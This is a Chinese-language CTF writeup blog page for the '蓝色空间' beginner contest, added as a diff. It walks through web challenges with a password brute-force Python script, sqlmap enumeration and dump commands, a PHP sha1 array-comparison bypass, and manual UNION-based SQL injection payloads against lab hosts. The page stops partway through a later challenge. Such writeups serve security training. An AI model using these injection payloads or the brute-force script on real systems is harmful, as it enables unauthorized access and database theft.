@@ -1,0 +1,596 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>蓝色空间CTF『欢乐赛』Writeup | 朝花夕拾</title><meta name="keywords" content="CTF,蓝色空间"><meta name="author" content="不旦枕戈"><meta name="copyright" content="不旦枕戈"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="快来看看蓝色空间CTF『欢乐赛』的答案趴~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝色空间CTF『欢乐赛』Writeup">
+<meta property="og:url" content="https://nrhs-space.github.io/2022/01/15/CTF-blue_space_wp/index.html">
+<meta property="og:site_name" content="朝花夕拾">
+<meta property="og:description" content="快来看看蓝色空间CTF『欢乐赛』的答案趴~">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s4.ax1x.com/2022/01/15/7GLgo9.png">
+<meta property="article:published_time" content="2022-01-15T03:11:43.000Z">
+<meta property="article:modified_time" content="2022-01-15T03:11:50.000Z">
+<meta property="article:author" content="不旦枕戈">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="蓝色空间">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s4.ax1x.com/2022/01/15/7GLgo9.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://nrhs-space.github.io/2022/01/15/CTF-blue_space_wp/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8d32f3f32e50ca331a0cc77ab592b373";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.json","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://npm.elemecdn.com/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://npm.elemecdn.com/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://npm.elemecdn.com/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '蓝色空间CTF『欢乐赛』Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-15 11:11:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="朝花夕拾" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://z3.ax1x.com/2021/12/01/oGMLgU.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-tags"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://linxi.ml/"><i class="fa-fw fab fa-font-awesome-flag"></i><span> 蓝色空间</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.threebody.com.cn/"><i class="fa-fw fab fa-accusoft"></i><span> 三体宇宙</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://47.115.206.192:5244/"><i class="fa-fw fa fa-paper-plane"></i><span> 花的小金库</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 花的小金库</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://nrhs.eu.org/"><i class="fa-fw far fa-envelope"></i><span> 城南旧事</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="http://sso.sxyyc.net/sso/login"><i class="fa-fw fa fa-university"></i><span> 三峡医专</span></a></li><li><a class="site-page child" href="/study/"><i class="fa-fw fas fa-archive"></i><span> 花的故事</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IDtuDbql0Wbn0FuxzkSBQQ"><i class="fa-fw fa fa-headphones"></i><span> 钟的吉他社</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="http://47.115.206.192:5700/"><i class="fa-fw fa fa-share-alt-square"></i><span> 一只猫的分享铺</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s4.ax1x.com/2022/01/15/7GLgo9.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">朝花夕拾</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-tags"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://linxi.ml/"><i class="fa-fw fab fa-font-awesome-flag"></i><span> 蓝色空间</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.threebody.com.cn/"><i class="fa-fw fab fa-accusoft"></i><span> 三体宇宙</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://47.115.206.192:5244/"><i class="fa-fw fa fa-paper-plane"></i><span> 花的小金库</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 花的小金库</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="noopener" href="http://nrhs.eu.org/"><i class="fa-fw far fa-envelope"></i><span> 城南旧事</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="http://sso.sxyyc.net/sso/login"><i class="fa-fw fa fa-university"></i><span> 三峡医专</span></a></li><li><a class="site-page child" href="/study/"><i class="fa-fw fas fa-archive"></i><span> 花的故事</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IDtuDbql0Wbn0FuxzkSBQQ"><i class="fa-fw fa fa-headphones"></i><span> 钟的吉他社</span></a></li><li><a class="site-page child" target="_blank" rel="noopener" href="http://47.115.206.192:5700/"><i class="fa-fw fa fa-share-alt-square"></i><span> 一只猫的分享铺</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">蓝色空间CTF『欢乐赛』Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-15T03:11:43.000Z" title="发表于 2022-01-15 11:11:43">2022-01-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-15T03:11:50.000Z" title="更新于 2022-01-15 11:11:50">2022-01-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="蓝色空间CTF『欢乐赛』Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/01/15/CTF-blue_space_wp/#post-comment"><span id="twikoo-count"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://s4.ax1x.com/2022/01/15/7GLgo9.png');"></div><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr>
+<h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1. 签到题"></a>1. 签到题</h2><div class="note no-icon flat"><p>目标链接:<a target="_blank" rel="noopener" href="http://shop.aqlab.cn:8001/">http://shop.aqlab.cn:8001/</a></p>
+</div>
+<p>利用web扫描工具扫描一下后台，这里使用御剑</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7GO2nS.png" alt=""></p>
+<p>发现有<code>/robots.txt</code>文件，访问一下看看</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7GO4ts.png" alt=""></p>
+<p>得到flag：<code>flag：flag-8adc-2230-ekd1</code></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{flag-8adc-2230-ekd1}</p>
+</div>
+<h2 id="2-简单爆破"><a href="#2-简单爆破" class="headerlink" title="2. 简单爆破"></a>2. 简单爆破</h2><div class="note no-icon flat"><p>目标链接:<a target="_blank" rel="noopener" href="http://95a9538e.lab.aqlab.cn/">http://95a9538e.lab.aqlab.cn/</a></p>
+</div>
+<p>打开链接，很直白告诉你登录名为:<code>admin</code>，密码为<u>6位纯数字</u></p>
+<p>打开开发者工具，随便提交一个密码数据上去，看看提交的内容与方式和返回内容</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7GXtCn.jpg" alt=""></p>
+<p>我们可以发现采用<code>post</code>提交了<code>uname</code>和<code>pass</code>两个数据，密码错误时<code>alert</code>弹出一个”账户密码错误”</p>
+<p>编写python脚本爆破：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 正则匹配与requests</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999999</span>):</span><br><span class="line">    i = <span class="number">100000</span>+i <span class="comment">#从最低6位整数开始循环提交</span></span><br><span class="line">    data={<span class="string">"uname"</span>:<span class="string">'admin'</span>,<span class="string">"pass"</span>:i}</span><br><span class="line">    res=requests.post(<span class="string">"http://95a9538e.lab.aqlab.cn/"</span>,data=data)</span><br><span class="line">    text=re.findall(<span class="string">r'&lt;script&gt;alert[(]"(.+?)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(text,i)</span><br><span class="line">	<span class="comment">#当返回的内容不一样时停止</span></span><br><span class="line">    <span class="keyword">if</span> text!=<span class="string">"账户密码错误"</span>: </span><br><span class="line">        exit()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/15/7GjdJA.jpg" alt=""></p>
+<p>得到flag：flag{66b6_77kkqa7}</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{66b6_77kkqa7}</p>
+</div>
+<h2 id="3-SQL或Web扫描"><a href="#3-SQL或Web扫描" class="headerlink" title="3. SQL或Web扫描"></a>3. SQL或Web扫描</h2><div class="note no-icon flat"><p>目标链接：<a target="_blank" rel="noopener" href="http://59.63.200.79:8003/bees/">http://59.63.200.79:8003/bees/</a></p>
+</div>
+<p>利用御剑扫描工具扫描到<code>/flag.txt</code>文件，访问即可</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag_{axdeDaf}</p>
+</div>
+<h2 id="4-SQL2"><a href="#4-SQL2" class="headerlink" title="4. SQL2"></a>4. SQL2</h2><div class="note no-icon flat"><p>目标链接：<a target="_blank" rel="noopener" href="http://59.63.200.79:8001/">http://59.63.200.79:8001/</a></p>
+</div>
+<p>注入型，先找一下注入点</p>
+<p>使用<code>Acunetix</code>工具扫一下，发现<code>single.php</code>文件，且存在<code>id</code>值</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7GxGUe.jpg" alt=""></p>
+<p>放到浏览器地址，看看单引号报错<code>/single.php?id=1'</code></p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7GxBb8.jpg" alt=""></p>
+<p>得到了绝对位置</p>
+<p>使用<code>sqlmap</code>捅一下它屁股</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://59.63.200.79:8001/single.php?id=1 –dbs –batch</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JpU29.png" alt=""></p>
+<p>得到了3个数据库对象</p>
+<p>下载查看一下第一个表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://59.63.200.79:8001/single.php?id=1 -D cake -T user –dump –batch</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JpIVf.jpg" alt=""></p>
+<p>呃，flag直接出来了”flag{flag-8adc-6513-e54az}”</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{flag-8adc-6513-e54az}</p>
+</div>
+<h2 id="5-简单代码审计"><a href="#5-简单代码审计" class="headerlink" title="5. 简单代码审计"></a>5. 简单代码审计</h2><div class="note no-icon flat"><p>目标链接:<a target="_blank" rel="noopener" href="http://web.t.ctf.wgpsec.org/sha/">http://web.t.ctf.wgpsec.org/sha/</a></p>
+</div>
+<p>点击进去发现是一段<code>php</code>代码，我们对其理解一下：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//判断是否get传入的name和password参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'password'</span>])){</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">" "</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>[<span class="string">'password'</span>]);</span><br><span class="line">	<span class="comment">//当有这两个参数时对其进行sha1加密</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">'name'</span>]));</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">'password'</span>]));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">	    <span class="comment">//如果name字段与password字段相等则输出：</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Your password can not be your name!'</span>; <span class="comment">//你的密码不能是你的名字</span></span><br><span class="line">		<span class="comment">//如果name字段与password字段加密后相等则输出：</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>); <span class="comment">//输出flag</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	    <span class="comment">//否则输出密码无效</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Invalid password.'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">//当没有这两个参数时输出：</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login first!'</span>; <span class="comment">//请先登录</span></span><br><span class="line"><span class="meta">?&gt;</span> Login first!  <span class="comment">//输出的消息</span></span><br></pre></td></tr></tbody></table></figure>
+<div class="checkbox"><input type="checkbox">
+            <p>cyan checked 理论存在，实践开始</p>
+            </div>
+<p>这里使用了<code>HackBar</code>插件进行传参,随便传入一个name和password试试:</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JcjeK.jpg" alt=""><br>其中输出了’Invalid password.’与加密后的两段参数的值。我们需要让name与password加密后相等,想个极端的值。但是直接传参会被转str加密。我们尝试让它为空值。利用数组，使其解密后均为空。<br></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.t.ctf.wgpsec.org/sha/?name[]=1&amp;password[]=2</span><br></pre></td></tr></tbody></table></figure><br><img src="https://s4.ax1x.com/2022/01/15/7J2Yut.png" alt=""><p></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{5afeca4cc117d368380a059e8c971d97}</p>
+</div>
+<h2 id="6-猫舍-SQL注入"><a href="#6-猫舍-SQL注入" class="headerlink" title="6. (猫舍)SQL注入"></a>6. (猫舍)SQL注入</h2><div class="tabs" id="sqlmap"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#sqlmap-1">Sqlmap</button></li><li class="tab"><button type="button" data-href="#sqlmap-2">手注</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="sqlmap-1"><div class="note no-icon flat"><p>目标链接：<a target="_blank" rel="noopener" href="http://rhiq8003.ia.aqlab.cn/">http://rhiq8003.ia.aqlab.cn/</a></p>
+</div>
+
+<p><img src="https://s4.ax1x.com/2022/01/15/7J5KEt.jpg" alt=""></p>
+<p>其中只有一个可点击位置，点击发现有id传入<code>?id=1</code>,尝试用<code>'</code>试试报错信息。但是显示异常，尝试修改id，其中<code>123</code>有内容。</p>
+<p>不管了，试试sqlmap捅屁股。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -dbs -batch</span><br></pre></td></tr></tbody></table></figure>
+<p>出现4个库</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JIUQe.jpg" alt=""></p>
+<p>打开<code>maoshe</code>库，看看里面的表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -tables -batch</span><br></pre></td></tr></tbody></table></figure>
+<p>出现4个表</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JIqlF.jpg" alt=""></p>
+<p>先看看<code>admin</code>表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://rhiq8003.ia.aqlab.cn/?id=1 -D maoshe -T admin -dump -batch</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://s4.ax1x.com/2022/01/15/7Jo9fK.jpg" alt=""></p>
+<p>en….我们先忽略一下广告。题目提示falg即为<psw>账户密码</psw>，试试<code>hellohack</code>。成功。</p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{hellohack}</p>
+</div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="sqlmap-2"><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/From-%E6%9E%97%E5%A4%95-orange?logo=&amp;color=orange&amp;link=&amp;"></object>
+
+<p>点击网页唯一一个可点击位置，发现<code>url</code>有传入参数<code>id</code>值，结合题目<code>sql</code>注入对注入点进行尝试</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=1   <code>显示正常</code></li>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=2   <code>显示异常</code></li>
+</ul>
+<p>利用<code>order by</code>语句进行字段探测</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=1 order by 1 <code>正常</code></li>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=1 order by 2 <code>正常</code></li>
+<li><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a> and 1=1 order by 3 <code>异常</code></li>
+</ul>
+<p>即只有两个字段</p>
+<p>利用<code>select</code>语句检测两个字段的显示</p>
+<p>由于<code>1=1</code>时会显示正常内容，所以我们让他报错采用<code>1=2</code></p>
+<p>可以看到字段2被显示出来了</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JojgS.png" alt=""></p>
+<p>我们利用第二个字段对数据库进行查询操作</p>
+<p>查数据库:<code>?id=1 and 1=2 union select 1,database()</code></p>
+<p>查库中所有表(利用<code>information_schema</code>基础表):<br></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></tbody></table></figure><p></p>
+<ul>
+<li>limit 0,1的意思是从0开始，查询第1个数据</li>
+</ul>
+<p>我们只需要admin所以其他的表我们就不查了</p>
+<p>查询数据表中的所有数据：</p>
+<ul>
+<li><p>表中第一个字段:?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 0,1</p>
+</li>
+<li><p>表中第二个字段: ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 1,1</p>
+</li>
+<li><p>表中第三个字段: ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name=’admin’ limit 2,1</p>
+</li>
+</ul>
+<p>查询limit 3,1无显示说明只有三个字段</p>
+<p>表名知道了，字段名知道了，这里直接使用select语句查询:</p>
+<ul>
+<li><p>用户名:<code>?id=1 and 1=2 union select 1,username from admin  limit 0,1</code></p>
+</li>
+<li><p>密码: <code>?id=1 and 1=2 union select 1,password from admin  limit 0,1</code></p>
+</li>
+</ul>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JTYKe.png" alt=""></p>
+<p>根据题目提示账户密码就是flag，<code>hellohack</code></p>
+<div class="note purple icon modern"><i class="note-icon fab fa-font-awesome-flag"></i><p>flag{hellohack}</p>
+</div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+<h2 id="7-尝试找到你的小姐姐吧！"><a href="#7-尝试找到你的小姐姐吧！" class="headerlink" title="7. 尝试找到你的小姐姐吧！"></a>7. 尝试找到你的小姐姐吧！</h2><div class="note no-icon flat"><p>题目链接：<a target="_blank" rel="noopener" href="http://web.t.ctf.wgpsec.org/notjustweb">http://web.t.ctf.wgpsec.org/notjustweb</a></p>
+</div>
+<p>打开之后只有一张小姐姐照片和一段话，提示我们<code>时间戳</code>作为验证码。<br><img src="https://s4.ax1x.com/2022/01/15/7J7OOg.jpg" alt=""></p>
+<p>这种题先看看<psw>robots.txt</psw>准没错。</p>
+<p>打开<code>robots.txt</code>得到一个目录：<code>/readme_hahah.txt</code></p>
+<p>进去看看</p>
+<p><img src="https://s4.ax1x.com/2022/01/15/7JHMp6.jpg" alt=""></p>
+<p>en…得到了一个默认用户名与密码，还有一个，哦不，半个链接。</p>
+<div class="checkbox yellow"><input type="radio">
